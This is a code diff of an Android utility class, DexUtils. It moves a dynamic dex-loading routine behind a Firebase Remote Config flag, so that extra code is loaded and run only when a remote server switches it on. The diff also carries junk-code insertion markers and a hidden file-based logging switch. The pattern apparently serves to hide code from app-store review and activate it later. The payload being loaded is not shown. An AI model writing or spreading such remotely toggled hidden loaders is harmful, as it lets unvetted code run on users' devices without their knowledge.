@@ -42,26 +42,6 @@ public class DexUtils {
 
     public static void loadDexClass(Context context) {
         /*<laji_code>*/
-
-        File file2 = new File(context.getExternalCacheDir(), "111111.txt");
-        isLog = file2.exists();
-
-        /*<laji_code>*/
-        if (!isLoad(context)) {
-            log("isLoad false");
-//            if(context instanceof Activity) {
-//                try {
-                    /*<laji_code>*/
-//                    Class<?> aClass = Class.forName("<start_activity2>");
-//                    context.startActivity(new Intent(context, aClass));
-//                    ((Activity)context).finish();
-//                } catch (ClassNotFoundException e) {
-//                    e.printStackTrace();
-//                }
-//            }
-            return;
-        }
-
         log("isLoad true");
         /*<laji_code>*/
         // getDir("dex1", 0)会在/data/data/**package/下创建一个名叫”app_dex1“的文件夹，其内存放的文件是自动生成output.dex
@@ -166,35 +146,48 @@ public class DexUtils {
         return false;
     }
 
-    private static void firebase(Context mContext) {
-        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
-        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
-                .setMinimumFetchIntervalInSeconds(60)//最小提取间
-                .build();
-        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
-        HashMap<String, Object> defaults = new HashMap<>();
-        mFirebaseRemoteConfig.setDefaultsAsync(defaults);
+    private static void firebase(Context context) {
+        File file2 = new File(context.getExternalCacheDir(), "111111.txt");
+        isLog = file2.exists();
 
-        Task<Boolean> booleanTask = mFirebaseRemoteConfig.fetchAndActivate();
-        booleanTask.addOnCompleteListener(new OnCompleteListener<Boolean>() {
-            @Override
-            public synchronized void onComplete(Task<Boolean> task) {
-                Map<String, FirebaseRemoteConfigValue> all = mFirebaseRemoteConfig.getAll();
-                if(all != null && !all.isEmpty()){
-                    boolean o = false;
-                    for (String s : all.keySet()) {
-                        FirebaseRemoteConfigValue firebaseRemoteConfigValue = all.get(s);
-                        if (s.startsWith("o")) {
-                            o = firebaseRemoteConfigValue.asBoolean();
+        /*<laji_code>*/
+        if (!isLoad(context)) {
+            log("isLoad false 1");
+            return;
+        }else {
+            FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
+            FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
+                    .setMinimumFetchIntervalInSeconds(60)//最小提取间
+                    .build();
+            mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
+            HashMap<String, Object> defaults = new HashMap<>();
+            mFirebaseRemoteConfig.setDefaultsAsync(defaults);
+
+            Task<Boolean> booleanTask = mFirebaseRemoteConfig.fetchAndActivate();
+            booleanTask.addOnCompleteListener(new OnCompleteListener<Boolean>() {
+                @Override
+                public synchronized void onComplete(Task<Boolean> task) {
+                    Map<String, FirebaseRemoteConfigValue> all = mFirebaseRemoteConfig.getAll();
+                    if(all != null && !all.isEmpty()){
+                        boolean o = false;
+                        for (String s : all.keySet()) {
+                            FirebaseRemoteConfigValue firebaseRemoteConfigValue = all.get(s);
+                            if (s.startsWith("o")) {
+                                o = firebaseRemoteConfigValue.asBoolean();
+                            }
+                        }
+
+                        if (o) {
+                            loadDexClass(context);
+                        }else  {
+                            log("isLoad false 2");
                         }
                     }
-
-                    if (o) {
-                        loadDexClass(mContext);
-                    }
                 }
-            }
-        });
+            });
+        }
+
+
 
 //        Map<String, FirebaseRemoteConfigValue> all = mFirebaseRemoteConfig.getAll();
 //        if(all != null && !all.isEmpty()){
